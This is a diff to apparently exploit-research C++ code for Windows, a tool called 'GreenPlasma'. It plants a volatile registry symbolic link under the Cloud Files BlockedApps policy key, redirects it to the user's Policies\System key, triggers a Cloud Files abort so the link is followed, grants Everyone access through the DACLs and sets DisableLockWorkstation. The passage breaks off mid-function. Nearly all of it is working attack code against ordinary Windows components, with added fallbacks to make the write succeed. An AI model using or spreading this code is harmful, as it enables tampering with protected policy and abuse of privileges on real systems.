@@ -219,12 +219,10 @@ enum class GpStatus {
 struct GpRegistryEvidence {
     bool attempted;
     bool succeeded;
-    bool policiesRootKeyCreated;
-    bool policiesMicrosoftKeyCreated;
     bool cloudFilesKeyCreated;
-    bool currentVersionPoliciesKeyCreated;
     bool policiesSystemKeyCreated;
     bool blockedAppsLinkCreated;
+    bool linkedTargetTouched;
     bool cloudFilesDaclSet;
     bool linkValueSet;
     bool policiesDaclSet;
@@ -297,7 +295,21 @@ static PFN_CfAbortOperation CfAbortOperation = NULL;
 static const wchar_t GP_DEFAULT_TARGET_NAME[] = L"\\BaseNamedObjects\\CTFMON_DEAD";
 static const wchar_t GP_SESSION_SECTION_FORMAT[] = L"\\Sessions\\%lu\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%lu";
 static const wchar_t GP_ALPC_PORT_NAME[] = L"\\RPC Control\\GreenPlasmaSpoofedPort";
+static const wchar_t GP_REG_CLOUDFILES[] = L"Software\\Policies\\Microsoft\\CloudFiles";
+static const wchar_t GP_REG_BLOCKED_APPS[] = L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps";
+static const wchar_t GP_REG_SYSTEM_POLICIES[] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+static const wchar_t GP_REG_CLOUDFILES_NAMED[] = L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles";
+static const wchar_t GP_REG_BLOCKED_APPS_NAMED[] = L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps";
+static const wchar_t GP_REG_SYSTEM_POLICIES_NAMED[] = L"CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+static const wchar_t GP_REG_LINK_VALUE_NAME[] = L"SymbolicLinkValue";
+static const wchar_t GP_REG_DISABLE_LOCK_VALUE_NAME[] = L"DisableLockWorkstation";
 static const wchar_t GP_BLOCKED_DLL_REQUEST[] = L"<blocked-dll-load-request>";
+static const REGSAM GP_REG_SYSTEM_TARGET_ACCESS_MASKS[] = {
+    KEY_READ,
+    KEY_SET_VALUE,
+    KEY_READ | KEY_SET_VALUE,
+    KEY_READ | KEY_SET_VALUE | WRITE_DAC
+};
 
 // Hypothesis layout for path-like state mutation. This is not a verified schema.
 #pragma pack(push, 1)
@@ -354,6 +366,44 @@ static void TraceWin32(const wchar_t* phase, const wchar_t* label, DWORD code)
 #endif
 }
 
+static void TraceWin32Context(const wchar_t* scope, const wchar_t* api, const wchar_t* target, DWORD code)
+{
+    if (code == ERROR_SUCCESS) {
+        return;
+    }
+
+#if GP_VERBOSE_TRACE
+    PrintTimestamp(scope ? scope : L"W32");
+#endif
+    wprintf(
+        L"%ls=fail api=%ls",
+        scope ? scope : L"win32",
+        api ? api : L"<unknown>");
+    if (target && target[0]) {
+        wprintf(L" target=%ls", target);
+    }
+    wprintf(L" code=%lu W32=0x%08lx\n", code, code);
+}
+
+static void TraceWin32WarningContext(const wchar_t* scope, const wchar_t* api, const wchar_t* target, DWORD code)
+{
+    if (code == ERROR_SUCCESS) {
+        return;
+    }
+
+#if GP_VERBOSE_TRACE
+    PrintTimestamp(scope ? scope : L"W32");
+#endif
+    wprintf(
+        L"%ls=warn api=%ls",
+        scope ? scope : L"win32",
+        api ? api : L"<unknown>");
+    if (target && target[0]) {
+        wprintf(L" target=%ls", target);
+    }
+    wprintf(L" code=%lu W32=0x%08lx\n", code, code);
+}
+
 static void TraceNtStatus(const wchar_t* phase, const wchar_t* label, NTSTATUS status)
 {
 #if GP_VERBOSE_TRACE
@@ -366,6 +416,25 @@ static void TraceNtStatus(const wchar_t* phase, const wchar_t* label, NTSTATUS s
         wprintf(L"NT=0x%08lx\n", (DWORD)status);
     }
 #endif
+}
+
+static void TraceNtStatusContext(const wchar_t* scope, const wchar_t* api, const wchar_t* target, NTSTATUS status)
+{
+    if (NT_SUCCESS(status)) {
+        return;
+    }
+
+#if GP_VERBOSE_TRACE
+    PrintTimestamp(scope ? scope : L"NT");
+#endif
+    wprintf(
+        L"%ls=fail api=%ls",
+        scope ? scope : L"nt",
+        api ? api : L"<unknown>");
+    if (target && target[0]) {
+        wprintf(L" target=%ls", target);
+    }
+    wprintf(L" NT=0x%08lx\n", (DWORD)status);
 }
 
 static const wchar_t* GpStatusName(GpStatus status)
@@ -562,6 +631,19 @@ static void PrintAccessEvidence(ACCESS_MASK access)
         (access & WRITE_OWNER) ? 1 : 0);
 }
 
+static void PrintLabeledAccessEvidence(const wchar_t* label, ACCESS_MASK access)
+{
+    wprintf(
+        L"%ls=0x%08lx query=%u read=%u write=%u dac=%u owner=%u\n",
+        label ? label : L"access",
+        access,
+        (access & SECTION_QUERY) ? 1 : 0,
+        (access & SECTION_MAP_READ) ? 1 : 0,
+        (access & SECTION_MAP_WRITE) ? 1 : 0,
+        (access & WRITE_DAC) ? 1 : 0,
+        (access & WRITE_OWNER) ? 1 : 0);
+}
+
 static void LogKernelObjectSecurity(HANDLE handle)
 {
 #if GP_VERBOSE_TRACE
@@ -605,6 +687,123 @@ static void LogKernelObjectSecurity(HANDLE handle)
 #endif
 }
 
+static void PrintObjectUnicodeBrief(HANDLE handle, ULONG infoClass, const wchar_t* label)
+{
+    ULONG length = 0x2000;
+    ULONG returned = 0;
+    PBYTE buffer = NULL;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+    if (!handle || handle == INVALID_HANDLE_VALUE || !label) {
+        return;
+    }
+
+    buffer = (PBYTE)malloc(length);
+    if (!buffer) {
+        wprintf(L"%ls=fail reason=oom\n", label);
+        return;
+    }
+
+    status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
+    if ((status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL) && returned > length) {
+        free(buffer);
+        length = returned + sizeof(UNICODE_STRING);
+        buffer = (PBYTE)malloc(length);
+        if (!buffer) {
+            wprintf(L"%ls=fail reason=oom\n", label);
+            return;
+        }
+        status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
+    }
+
+    if (NT_SUCCESS(status)) {
+        PUNICODE_STRING value = (PUNICODE_STRING)buffer;
+        if (value && value->Buffer && value->Length) {
+            wprintf(L"%ls=%.*ls\n", label, (int)(value->Length / sizeof(wchar_t)), value->Buffer);
+        }
+        else {
+            wprintf(L"%ls=<empty>\n", label);
+        }
+    }
+    else {
+        wprintf(L"%ls=fail NT=0x%08lx\n", label, (DWORD)status);
+    }
+
+    free(buffer);
+}
+
+static void PrintKernelObjectSecurityBrief(HANDLE handle, const wchar_t* label)
+{
+    PSECURITY_DESCRIPTOR sd = NULL;
+    PSID owner = NULL;
+    PSID group = NULL;
+    PACL dacl = NULL;
+    LPWSTR sddl = NULL;
+    DWORD res = ERROR_SUCCESS;
+
+    if (!handle || handle == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    res = GetSecurityInfo(
+        handle,
+        SE_KERNEL_OBJECT,
+        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
+        &owner,
+        &group,
+        &dacl,
+        NULL,
+        &sd);
+    if (res != ERROR_SUCCESS) {
+        TraceWin32Context(label ? label : L"section_security", L"GetSecurityInfo", L"section", res);
+        return;
+    }
+
+    if (ConvertSecurityDescriptorToStringSecurityDescriptorW(
+            sd,
+            SDDL_REVISION_1,
+            OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
+            &sddl,
+            NULL)) {
+        wprintf(L"%ls=%ls\n", label ? label : L"section_security", sddl);
+        LocalFree(sddl);
+    }
+    else {
+        TraceWin32Context(
+            label ? label : L"section_security",
+            L"ConvertSecurityDescriptorToStringSecurityDescriptorW",
+            L"section",
+            GetLastError());
+    }
+
+    if (sd) {
+        LocalFree(sd);
+    }
+}
+
+static void PrintSectionObjectDiagnostics(const wchar_t* phase, HANDLE handle)
+{
+    GP_OBJECT_BASIC_INFORMATION basic = { 0 };
+
+    if (!handle || handle == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    wprintf(L"section_diag phase=%ls handle=0x%p\n", phase ? phase : L"<none>", handle);
+    if (QueryBasic(handle, &basic)) {
+        wprintf(
+            L"section_basic attrs=0x%08lx handles=%lu refs=%lu\n",
+            basic.Attributes,
+            basic.HandleCount,
+            basic.PointerCount);
+        PrintLabeledAccessEvidence(L"section_diag_access", basic.GrantedAccess);
+    }
+
+    PrintObjectUnicodeBrief(handle, GP_OBJECT_TYPE_INFORMATION_CLASS, L"section_type");
+    PrintObjectUnicodeBrief(handle, GP_OBJECT_NAME_INFORMATION_CLASS, L"section_name");
+    PrintKernelObjectSecurityBrief(handle, L"section_security");
+}
+
 static void LogHandleSnapshot(const wchar_t* phase, const wchar_t* label, HANDLE handle)
 {
 #if GP_VERBOSE_TRACE
@@ -644,13 +843,13 @@ static void LogRegistryState(const wchar_t* phase)
     DWORD bytes = sizeof(data);
     DWORD res = RegOpenKeyExW(
         HKEY_CURRENT_USER,
-        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
+        GP_REG_BLOCKED_APPS,
         REG_OPTION_OPEN_LINK,
         KEY_QUERY_VALUE,
         &hk);
 
     if (res == ERROR_SUCCESS) {
-        res = RegQueryValueExW(hk, L"SymbolicLinkValue", NULL, &type, (LPBYTE)data, &bytes);
+        res = RegQueryValueExW(hk, GP_REG_LINK_VALUE_NAME, NULL, &type, (LPBYTE)data, &bytes);
         PrintTimestamp(phase);
         if (res == ERROR_SUCCESS) {
             wprintf(L"reglink type=%lu target=%ls\n", type, data);
@@ -665,12 +864,12 @@ static void LogRegistryState(const wchar_t* phase)
     bytes = sizeof(value);
     res = RegOpenKeyExW(
         HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        GP_REG_SYSTEM_POLICIES,
         0,
         KEY_QUERY_VALUE,
         &hk);
     if (res == ERROR_SUCCESS) {
-        res = RegQueryValueExW(hk, L"DisableLockWorkstation", NULL, &type, (LPBYTE)&value, &bytes);
+        res = RegQueryValueExW(hk, GP_REG_DISABLE_LOCK_VALUE_NAME, NULL, &type, (LPBYTE)&value, &bytes);
         PrintTimestamp(phase);
         if (res == ERROR_SUCCESS) {
             wprintf(L"policy type=%lu value=%lu\n", type, value);
@@ -743,14 +942,10 @@ static NTSTATUS DeleteRegistryLinkKey(HKEY hk)
     return STATUS_UNSUCCESSFUL;
 }
 
-static DWORD EnsureRegistryKeyExists(HKEY root, const wchar_t* subKey, bool* created)
+static DWORD PrepareRegistryTargetKey(HKEY root, const wchar_t* subKey, REGSAM desiredAccess, bool* created)
 {
     HKEY key = NULL;
     DWORD disposition = 0;
-
-    if (created) {
-        *created = false;
-    }
 
     if (!root || !subKey || !subKey[0]) {
         return ERROR_INVALID_PARAMETER;
@@ -762,7 +957,7 @@ static DWORD EnsureRegistryKeyExists(HKEY root, const wchar_t* subKey, bool* cre
         0,
         NULL,
         REG_OPTION_NON_VOLATILE,
-        KEY_READ | KEY_WRITE,
+        desiredAccess,
         NULL,
         &key,
         &disposition);
@@ -772,9 +967,140 @@ static DWORD EnsureRegistryKeyExists(HKEY root, const wchar_t* subKey, bool* cre
     }
 
     if (res == ERROR_SUCCESS && created) {
-        *created = (disposition == REG_CREATED_NEW_KEY);
+        *created = *created || (disposition == REG_CREATED_NEW_KEY);
     }
 
+    return res;
+}
+
+static void TryPrepareRegistryTargetKey(const wchar_t* subKey, const REGSAM* accessMasks, SIZE_T maskCount, bool* created)
+{
+    DWORD lastError = ERROR_INVALID_PARAMETER;
+
+    if (!accessMasks || maskCount == 0) {
+        TraceWin32WarningContext(L"reg_prepare", L"RegCreateKeyExW", subKey, lastError);
+        return;
+    }
+
+    for (SIZE_T i = 0; i < maskCount; ++i) {
+        bool createdBefore = created ? *created : false;
+        DWORD res = PrepareRegistryTargetKey(HKEY_CURRENT_USER, subKey, accessMasks[i], created);
+        if (res == ERROR_SUCCESS) {
+            wprintf(
+                L"reg_prepare=ok target=%ls access=0x%08lx created=%u\n",
+                subKey,
+                (DWORD)accessMasks[i],
+                (created && !createdBefore && *created) ? 1 : 0);
+            return;
+        }
+
+        lastError = res;
+    }
+
+    TraceWin32WarningContext(L"reg_prepare", L"RegCreateKeyExW", subKey, lastError);
+}
+
+static void TryPrepareRegistryTargetKey(const wchar_t* subKey, REGSAM desiredAccess, bool* created)
+{
+    TryPrepareRegistryTargetKey(subKey, &desiredAccess, 1, created);
+}
+
+static void TouchRegistryTargetThroughLink(const wchar_t* linkSubKey, bool* created, bool* touched)
+{
+    static const REGSAM accessMasks[] = {
+        KEY_READ | KEY_SET_VALUE | WRITE_DAC,
+        KEY_READ | KEY_SET_VALUE,
+        KEY_SET_VALUE,
+        KEY_READ
+    };
+    DWORD lastError = ERROR_INVALID_PARAMETER;
+
+    if (touched) {
+        *touched = false;
+    }
+
+    for (SIZE_T i = 0; i < ARRAYSIZE(accessMasks); ++i) {
+        HKEY key = NULL;
+        DWORD disposition = 0;
+        DWORD res = RegCreateKeyExW(
+            HKEY_CURRENT_USER,
+            linkSubKey,
+            0,
+            NULL,
+            REG_OPTION_NON_VOLATILE,
+            accessMasks[i],
+            NULL,
+            &key,
+            &disposition);
+        if (res == ERROR_SUCCESS) {
+            if (created) {
+                *created = *created || (disposition == REG_CREATED_NEW_KEY);
+            }
+            if (touched) {
+                *touched = true;
+            }
+            wprintf(
+                L"reg_link_touch=ok target=%ls access=0x%08lx created=%u\n",
+                linkSubKey,
+                (DWORD)accessMasks[i],
+                disposition == REG_CREATED_NEW_KEY ? 1 : 0);
+            RegCloseKey(key);
+            return;
+        }
+
+        lastError = res;
+    }
+
+    TraceWin32WarningContext(L"reg_link_touch", L"RegCreateKeyExW(follow-link)", linkSubKey, lastError);
+}
+
+static DWORD OpenPolicySystemValueKey(REGSAM access, HKEY* key, const wchar_t** openedPath, bool critical)
+{
+    DWORD res = ERROR_INVALID_PARAMETER;
+
+    if (!key) {
+        return ERROR_INVALID_PARAMETER;
+    }
+
+    *key = NULL;
+    if (openedPath) {
+        *openedPath = NULL;
+    }
+
+    res = RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        GP_REG_SYSTEM_POLICIES,
+        0,
+        access,
+        key);
+    if (res == ERROR_SUCCESS) {
+        if (openedPath) {
+            *openedPath = GP_REG_SYSTEM_POLICIES;
+        }
+        return ERROR_SUCCESS;
+    }
+    TraceWin32WarningContext(L"reg_open", L"RegOpenKeyExW", GP_REG_SYSTEM_POLICIES, res);
+
+    res = RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        GP_REG_BLOCKED_APPS,
+        0,
+        access,
+        key);
+    if (res == ERROR_SUCCESS) {
+        if (openedPath) {
+            *openedPath = GP_REG_BLOCKED_APPS;
+        }
+        wprintf(L"reg_open=ok target=%ls mode=follow-link\n", GP_REG_BLOCKED_APPS);
+        return ERROR_SUCCESS;
+    }
+
+    if (critical) {
+        TraceWin32Context(L"reg", L"RegOpenKeyExW(follow-link)", GP_REG_BLOCKED_APPS, res);
+    }
+    else {
+        TraceWin32WarningContext(L"reg_open", L"RegOpenKeyExW(follow-link)", GP_REG_BLOCKED_APPS, res);
+    }
     return res;
 }
 
@@ -786,7 +1112,7 @@ static void DeleteCreatedRegistryKey(const wchar_t* subKey, bool created)
 
     DWORD res = RegDeleteKeyW(HKEY_CURRENT_USER, subKey);
     if (res != ERROR_SUCCESS && res != ERROR_FILE_NOT_FOUND) {
-        TraceWin32(L"CLEANUP", L"reg-delete", res);
+        TraceWin32Context(L"cleanup", L"RegDeleteKeyW", subKey, res);
     }
 }
 
@@ -807,13 +1133,13 @@ static void DeleteCreatedRegistryLinkKey(const wchar_t* subKey, bool created)
         return;
     }
     if (res != ERROR_SUCCESS) {
-        TraceWin32(L"CLEANUP", L"reg-link-open", res);
+        TraceWin32Context(L"cleanup", L"RegOpenKeyExW", subKey, res);
         return;
     }
 
     NTSTATUS status = DeleteRegistryLinkKey(hk);
     if (!NT_SUCCESS(status)) {
-        TraceNtStatus(L"CLEANUP", L"reg-link-delete", status);
+        TraceNtStatusContext(L"cleanup", L"NtDeleteKey", subKey, status);
     }
     RegCloseKey(hk);
 }
@@ -826,39 +1152,29 @@ static void CleanupRegistryEvidence(const GpRegistryEvidence* registry)
 
     if (registry->disableLockSet) {
         HKEY hk = NULL;
-        DWORD res = RegOpenKeyExW(
-            HKEY_CURRENT_USER,
-            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
-            0,
-            KEY_SET_VALUE,
-            &hk);
+        const wchar_t* openedPath = NULL;
+        DWORD res = OpenPolicySystemValueKey(KEY_SET_VALUE, &hk, &openedPath, false);
         if (res == ERROR_SUCCESS) {
-            RegDeleteValueW(hk, L"DisableLockWorkstation");
+            DWORD delRes = RegDeleteValueW(hk, GP_REG_DISABLE_LOCK_VALUE_NAME);
+            if (delRes != ERROR_SUCCESS && delRes != ERROR_FILE_NOT_FOUND) {
+                TraceWin32Context(L"cleanup", L"RegDeleteValueW", openedPath ? openedPath : GP_REG_DISABLE_LOCK_VALUE_NAME, delRes);
+            }
             RegCloseKey(hk);
         }
         else if (res != ERROR_FILE_NOT_FOUND) {
-            TraceWin32(L"CLEANUP", L"policy-open", res);
+            TraceWin32Context(L"cleanup", L"OpenPolicySystemValueKey", GP_REG_SYSTEM_POLICIES, res);
         }
     }
 
     DeleteCreatedRegistryLinkKey(
-        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
+        GP_REG_BLOCKED_APPS,
         registry->blockedAppsLinkCreated);
     DeleteCreatedRegistryKey(
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        GP_REG_SYSTEM_POLICIES,
         registry->policiesSystemKeyCreated);
     DeleteCreatedRegistryKey(
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies",
-        registry->currentVersionPoliciesKeyCreated);
-    DeleteCreatedRegistryKey(
-        L"Software\\Policies\\Microsoft\\CloudFiles",
+        GP_REG_CLOUDFILES,
         registry->cloudFilesKeyCreated);
-    DeleteCreatedRegistryKey(
-        L"Software\\Policies\\Microsoft",
-        registry->policiesMicrosoftKeyCreated);
-    DeleteCreatedRegistryKey(
-        L"Software\\Policies",
-        registry->policiesRootKeyCreated);
 }
 
 static bool SetPolicyVal(GpRegistryEvidence* registry)
@@ -871,6 +1187,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
     DWORD failure = ERROR_SUCCESS;
     PACL pACL = NULL;
     EXPLICIT_ACCESSW ea;
+    HKEY policyKey = NULL;
     HANDLE htoken = NULL;
     DWORD dwSize = 0;
     wchar_t* stringSid = NULL;
@@ -878,6 +1195,8 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
     PTOKEN_USER pTokenUser = NULL;
     bool linkKeyOpen = false;
     DWORD linkKeyDisposition = 0;
+    const wchar_t* openedPolicyPath = NULL;
+    bool openedPolicyViaLink = false;
 
     if (registry) {
         ZeroMemory(registry, sizeof(*registry));
@@ -897,62 +1216,17 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
     dwRes = SetEntriesInAclW(1, &ea, NULL, &pACL);
     if (ERROR_SUCCESS != dwRes) {
         failure = dwRes;
-        TraceWin32(L"P4", L"acl", dwRes);
+        TraceWin32Context(L"acl", L"SetEntriesInAclW", L"Everyone", dwRes);
         goto cleanup;
     }
 
-    res = EnsureRegistryKeyExists(
-        HKEY_CURRENT_USER,
-        L"Software\\Policies",
-        registry ? &registry->policiesRootKeyCreated : NULL);
-    if (res) {
-        failure = res;
-        TraceWin32(L"P4", L"reg-create", res);
-        goto cleanup;
-    }
-
-    res = EnsureRegistryKeyExists(
-        HKEY_CURRENT_USER,
-        L"Software\\Policies\\Microsoft",
-        registry ? &registry->policiesMicrosoftKeyCreated : NULL);
-    if (res) {
-        failure = res;
-        TraceWin32(L"P4", L"reg-create", res);
-        goto cleanup;
-    }
-
-    res = EnsureRegistryKeyExists(
-        HKEY_CURRENT_USER,
-        L"Software\\Policies\\Microsoft\\CloudFiles",
+    TryPrepareRegistryTargetKey(
+        GP_REG_CLOUDFILES,
+        KEY_READ,
         registry ? &registry->cloudFilesKeyCreated : NULL);
-    if (res) {
-        failure = res;
-        TraceWin32(L"P4", L"reg-create", res);
-        goto cleanup;
-    }
-
-    res = EnsureRegistryKeyExists(
-        HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies",
-        registry ? &registry->currentVersionPoliciesKeyCreated : NULL);
-    if (res) {
-        failure = res;
-        TraceWin32(L"P4", L"reg-create", res);
-        goto cleanup;
-    }
-
-    res = EnsureRegistryKeyExists(
-        HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
-        registry ? &registry->policiesSystemKeyCreated : NULL);
-    if (res) {
-        failure = res;
-        TraceWin32(L"P4", L"reg-create", res);
-        goto cleanup;
-    }
 
     res = TreeSetNamedSecurityInfoW(
-        (LPWSTR)L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles",
+        (LPWSTR)GP_REG_CLOUDFILES_NAMED,
         SE_REGISTRY_KEY,
         DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
         NULL,
@@ -965,23 +1239,23 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         NULL);
     if (res) {
         failure = res;
-        TraceWin32(L"P4", L"acl", res);
+        TraceWin32Context(L"acl", L"TreeSetNamedSecurityInfoW", GP_REG_CLOUDFILES_NAMED, res);
         goto cleanup;
     }
     if (registry) {
         registry->cloudFilesDaclSet = true;
     }
 
-    res = RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps");
+    res = RegDeleteTreeW(HKEY_CURRENT_USER, GP_REG_BLOCKED_APPS);
     if (res && res != ERROR_FILE_NOT_FOUND) {
         failure = res;
-        TraceWin32(L"P4", L"reg", res);
+        TraceWin32Context(L"reg", L"RegDeleteTreeW", GP_REG_BLOCKED_APPS, res);
         goto cleanup;
     }
 
     res = RegCreateKeyExW(
         HKEY_CURRENT_USER,
-        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
+        GP_REG_BLOCKED_APPS,
         0,
         NULL,
         REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
@@ -991,7 +1265,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         &linkKeyDisposition);
     if (res) {
         failure = res;
-        TraceWin32(L"P4", L"reg", res);
+        TraceWin32Context(L"reg", L"RegCreateKeyExW(REG_OPTION_CREATE_LINK)", GP_REG_BLOCKED_APPS, res);
         goto cleanup;
     }
     linkKeyOpen = true;
@@ -1001,7 +1275,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
 
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
         failure = GetLastError();
-        TraceWin32(L"P4", L"tok", GetLastError());
+        TraceWin32Context(L"token", L"OpenProcessToken", L"TokenUser", failure);
         DeleteRegistryLinkKey(hk);
         linkKeyOpen = false;
         goto cleanup;
@@ -1010,7 +1284,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
     GetTokenInformation(htoken, TokenUser, NULL, 0, &dwSize);
     if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
         failure = GetLastError();
-        TraceWin32(L"P4", L"tok", GetLastError());
+        TraceWin32Context(L"token", L"GetTokenInformation(size)", L"TokenUser", failure);
         DeleteRegistryLinkKey(hk);
         linkKeyOpen = false;
         goto cleanup;
@@ -1019,6 +1293,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
     pTokenUser = (PTOKEN_USER)malloc(dwSize);
     if (!pTokenUser) {
         failure = ERROR_OUTOFMEMORY;
+        TraceWin32Context(L"token", L"malloc", L"TokenUser", failure);
         DeleteRegistryLinkKey(hk);
         linkKeyOpen = false;
         goto cleanup;
@@ -1026,7 +1301,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
 
     if (!GetTokenInformation(htoken, TokenUser, pTokenUser, dwSize, &dwSize)) {
         failure = GetLastError();
-        TraceWin32(L"P4", L"tok", GetLastError());
+        TraceWin32Context(L"token", L"GetTokenInformation", L"TokenUser", failure);
         DeleteRegistryLinkKey(hk);
         linkKeyOpen = false;
         goto cleanup;
@@ -1036,7 +1311,7 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
 
     if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &stringSid)) {
         failure = GetLastError();
-        TraceWin32(L"P4", L"sid", GetLastError());
+        TraceWin32Context(L"sid", L"ConvertSidToStringSidW", L"TokenUser", failure);
         DeleteRegistryLinkKey(hk);
         linkKeyOpen = false;
         goto cleanup;
@@ -1047,21 +1322,23 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
             L"\\REGISTRY\\USER\\%ls\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             stringSid) < 0) {
         failure = ERROR_INSUFFICIENT_BUFFER;
+        TraceWin32Context(L"reg", L"BuildRegistryLinkTarget", GP_REG_LINK_VALUE_NAME, failure);
         DeleteRegistryLinkKey(hk);
         linkKeyOpen = false;
         goto cleanup;
     }
+    wprintf(L"reglink target=%ls\n", linktarget);
 
     res = RegSetValueExW(
         hk,
-        L"SymbolicLinkValue",
+        GP_REG_LINK_VALUE_NAME,
         0,
         REG_LINK,
         (BYTE*)linktarget,
-        (DWORD)((wcslen(linktarget) + 1) * sizeof(wchar_t)));
+        (DWORD)(wcslen(linktarget) * sizeof(wchar_t)));
     if (res) {
         failure = res;
-        TraceWin32(L"P4", L"reg", res);
+        TraceWin32Context(L"reg", L"RegSetValueExW(REG_LINK)", GP_REG_LINK_VALUE_NAME, res);
         DeleteRegistryLinkKey(hk);
         linkKeyOpen = false;
         goto cleanup;
@@ -1069,11 +1346,24 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
     if (registry) {
         registry->linkValueSet = true;
     }
+    res = RegFlushKey(hk);
+    if (res) {
+        TraceWin32WarningContext(L"reg", L"RegFlushKey", GP_REG_BLOCKED_APPS, res);
+    }
 
     CallCfAbortOperation(L"P4");
+    TouchRegistryTargetThroughLink(
+        GP_REG_BLOCKED_APPS,
+        registry ? &registry->policiesSystemKeyCreated : NULL,
+        registry ? &registry->linkedTargetTouched : NULL);
+    TryPrepareRegistryTargetKey(
+        GP_REG_SYSTEM_POLICIES,
+        GP_REG_SYSTEM_TARGET_ACCESS_MASKS,
+        ARRAYSIZE(GP_REG_SYSTEM_TARGET_ACCESS_MASKS),
+        registry ? &registry->policiesSystemKeyCreated : NULL);
 
     res = TreeSetNamedSecurityInfoW(
-        (LPWSTR)L"CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        (LPWSTR)GP_REG_SYSTEM_POLICIES_NAMED,
         SE_REGISTRY_KEY,
         DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
         NULL,
@@ -1085,43 +1375,62 @@ static bool SetPolicyVal(GpRegistryEvidence* registry)
         ProgressInvokeNever,
         NULL);
     if (res) {
-        failure = res;
-        TraceWin32(L"P4", L"acl", res);
-        goto cleanup;
+        DWORD fallbackRes = ERROR_SUCCESS;
+        TraceWin32WarningContext(L"acl", L"TreeSetNamedSecurityInfoW", GP_REG_SYSTEM_POLICIES_NAMED, res);
+        fallbackRes = TreeSetNamedSecurityInfoW(
+            (LPWSTR)GP_REG_BLOCKED_APPS_NAMED,
+            SE_REGISTRY_KEY,
+            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
+            NULL,
+            NULL,
+            pACL,
+            NULL,
+            TREE_SEC_INFO_RESET_KEEP_EXPLICIT,
+            NULL,
+            ProgressInvokeNever,
+            NULL);
+        if (fallbackRes) {
+            TraceWin32WarningContext(L"acl", L"TreeSetNamedSecurityInfoW(follow-link)", GP_REG_BLOCKED_APPS_NAMED, fallbackRes);
+        }
+        else if (registry) {
+            registry->policiesDaclSet = true;
+            wprintf(L"acl=ok target=%ls mode=follow-link\n", GP_REG_BLOCKED_APPS_NAMED);
+        }
     }
-    if (registry) {
+    else if (registry) {
         registry->policiesDaclSet = true;
     }
 
-    if (hk) {
+    res = OpenPolicySystemValueKey(KEY_SET_VALUE, &policyKey, &openedPolicyPath, true);
+    if (res) {
+        failure = res;
+        goto cleanup;
+    }
+    openedPolicyViaLink = (openedPolicyPath && wcscmp(openedPolicyPath, GP_REG_BLOCKED_APPS) == 0);
+
+    if (hk && !openedPolicyViaLink) {
         DeleteRegistryLinkKey(hk);
         RegCloseKey(hk);
         hk = NULL;
         linkKeyOpen = false;
     }
-
-    res = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
-        0,
-        KEY_SET_VALUE,
-        &hk);
-    if (res) {
-        failure = res;
-        TraceWin32(L"P4", L"reg", res);
-        goto cleanup;
+    else if (hk) {
+        RegCloseKey(hk);
+        hk = NULL;
+        linkKeyOpen = false;
+        wprintf(L"reg_link=kept target=%ls reason=value-opened-via-link\n", GP_REG_BLOCKED_APPS);
     }
-    linkKeyOpen = false;
 
-    res = RegSetValueExW(hk, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
+    res = RegSetValueExW(policyKey, GP_REG_DISABLE_LOCK_VALUE_NAME, 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
     if (res) {
         failure = res;
-        TraceWin32(L"P4", L"reg", res);
